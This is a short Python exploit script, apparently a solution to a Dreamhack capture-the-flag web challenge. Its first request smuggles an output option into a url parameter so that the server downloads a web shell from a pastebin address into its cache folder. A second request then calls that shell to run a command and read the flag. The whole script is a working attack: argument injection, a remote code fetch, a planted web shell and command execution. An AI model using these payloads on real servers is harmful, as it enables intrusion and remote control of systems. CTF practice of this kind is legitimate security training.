from bs4 import BeautifulSoup
import requests

URL = 'http://host3.dreamhack.games:23538/'
PAYLOAD01 = '?url=https://pastebin.com/raw/mgQU8NkN -o ./cache/webshell.php'
PAYLOAD02 = 'cache/webshell.php?cmd=/flag'

# 1. Upload Webshell
requests.get(URL + PAYLOAD01)

# 2. Execute /flag on server
resp = requests.get(URL + PAYLOAD02)

soup = BeautifulSoup(resp.content,"html.parser")
pre = soup.find('pre')
flag = pre.contents[0].replace('\n', '')
print(flag)